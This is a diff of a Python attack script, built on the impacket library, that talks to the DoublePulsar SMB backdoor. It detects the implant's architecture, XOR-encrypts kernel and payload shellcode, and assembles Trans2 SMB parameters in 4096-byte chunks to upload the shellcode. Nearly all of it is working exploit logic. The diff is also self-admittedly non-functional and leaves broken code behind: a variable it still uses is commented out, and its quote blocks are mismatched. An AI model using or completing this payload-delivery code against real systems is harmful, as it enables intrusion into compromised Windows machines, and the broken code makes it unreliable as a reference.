@@ -1,12 +1,6 @@
 #!/usr/bin/python
 
-'''
-
-This file is not working currently
-
-Please do not use this file as it is not working currently at this time
-
-'''
+#Please do not use this file, as this file is not working currently at this time
 
 import binascii
 import socket
@@ -14,7 +8,7 @@ from impacket import smb
 import struct
 
 # for XOR decryption
-from itertools import cycle
+#from itertools import cycle
 
 class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
     structure = (
@@ -39,14 +33,20 @@ def calculate_doublepulsar_arch(s):
         return "x86 (32-bit)"
     else:
         return "x64 (64-bit)"
-
+'''
 def xor_encrypt(data, key):
     return bytearray(a^b for a, b in zip(*map(bytearray, [data, key])))
+'''
 
 def byte_xor(data, key):
+    key_bytes = key.to_bytes(4, byteorder='little')
+    key_length = len(key_bytes)
+    '''
     for i in range(len(data)):
-        data[i] ^= key[i % len(key)]
+        data[i] ^= key_bytes[i % key_length]
     return data
+    '''
+    return bytearray(data[i] ^ key_bytes[i % key_length] for i in range(len(data)))
 
 def read_dll_file_as_hex():
     global hex
@@ -229,28 +229,28 @@ if __name__ == "__main__":
         #sample XOR key, we'll use our real one that was generated above on line 214
         #xor_key = 0x58581162
         xor_key = key
-        packed_xor_key = struct.pack('<I', xor_key)
-        print(packed_xor_key)
+        #packed_xor_key = struct.pack('<I', xor_key)
+        #print(packed_xor_key)
         # at this moment, uploading DLL files is not completed.
         # read file into memory here
         # read_dll_file_as_hex()
         
         #generate the final payload shellcode first
-        modified_kernel_shellcode = bytearray(kernel_shellcode)
-        bytes_payload_shellcode = bytearray(payload_shellcode)
+        #modified_kernel_shellcode = bytearray(kernel_shellcode)
+        #bytes_payload_shellcode = bytearray(payload_shellcode)
 
         # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
         payload_shellcode_size = len(payload_shellcode)
 
         payload_shellcode_size_in_hex = struct.pack('<H', payload_shellcode_size)
-        modified_kernel_shellcode += payload_shellcode_size_in_hex
-        modified_kernel_shellcode += bytes_payload_shellcode
+        #modified_kernel_shellcode += payload_shellcode_size_in_hex
+        #modified_kernel_shellcode += bytes_payload_shellcode
 
         shellcode_payload_size = len(modified_kernel_shellcode)
         print("Total size of shellcode:  %d" % shellcode_payload_size)
 
         # xor the payload data now
-        byte_xor(modified_kernel_shellcode, packed_xor_key)
+        xor_bytes = byte_xor(modified_kernel_shellcode, key)
     
     
         ''' Commenting out for now since we are not sure if this even works
@@ -273,22 +273,22 @@ if __name__ == "__main__":
         EntireShellcodeSize = len(modified_kernel_shellcode)
         print("Generating the Doublepulsar parameters...")
         parameters = b''
-        EntireSize = struct.pack('<I', EntireShellcodeSize) #Total Size of the payload here
-        ChunkSize = struct.pack('<I', EntireShellcodeSize)  #size of the chunk
+        EntireSize = struct.pack('<I', 4096) #Total Size of the payload here
+        ChunkSize = struct.pack('<I', 4096)  #size of the chunk
         offset = struct.pack('<I', 0)        #offset of the payload
         parameters += EntireSize
         parameters += ChunkSize
         parameters += offset
-        print(parameters)
+        #print(parameters)
         print(hexdump(parameters))
         ''' Expected output for Entire size & Chunk size at 4096 and offset of 0
         b'\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00'
         ['00000000  00 10 00 00 00 10 00 00  00 00 00 00             |............    |']
         '''
         parameters_bytearray = bytearray(parameters)
-        byte_xor(parameters_bytearray, array_xor_key)
+        xor_parameters = byte_xor(parameters_bytearray, array_xor_key)
         
-        print(parameters_bytearray)
+        #print(parameters_bytearray)
         print(hexdump(parameters_bytearray))
         ''' Expected output for Entire size & Chunk size at 4096 and offset of 0 encrypted with XOR key of 0x58581162
         bytearray(b'b\x01XXb\x01XXb\x11XX')
@@ -322,17 +322,17 @@ if __name__ == "__main__":
         
         
         
-        XOR_EntireSize = struct.pack('<I', EntireShellcodeSize)
-        XOR_ChunkSize = struct.pack('<I', EntireShellcodeSize)
+        XOR_EntireSize = struct.pack('<I', 4096)
+        XOR_ChunkSize = struct.pack('<I', 4096)
         XOR_offset = struct.pack('<I', 0)
 
         XOR_EntireSize_bytearray = bytearray(XOR_EntireSize)
         XOR_ChunkSize_bytearray = bytearray(XOR_ChunkSize)
         XOR_offset_bytearray = bytearray(XOR_offset)
 
-        byte_xor(XOR_EntireSize_bytearray, packed_xor_key)
-        byte_xor(XOR_ChunkSize_bytearray, packed_xor_key)
-        byte_xor(XOR_offset_bytearray, packed_xor_key)
+        #byte_xor(XOR_EntireSize_bytearray, xor_key)
+        #byte_xor(XOR_ChunkSize_bytearray, xor_key)
+        #byte_xor(XOR_offset_bytearray, xor_key)
         '''
         rather than generate the parameters all in one, we'll try to 
         generate them one by one and attach it to the struct
@@ -384,9 +384,12 @@ if __name__ == "__main__":
         transCommand['Parameters']['ParameterOffset'] = 0
 
         # Xor encrypt the parameters
-        '''DataCount ( total size of the shellcode )
+        '''
+        '''
+        DataCount ( total size of the shellcode )
             ChunkSize ( size of the shellcode chunk, or 4096 )
             Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
+        '''
         '''
         transCommand['Parameters']['DataCount'] = xor_encrypt(len(modified_kernel_shellcode), key)
         transCommand['Parameters']['ChunkSize'] = xor_encrypt(len(modified_kernel_shellcode), key)
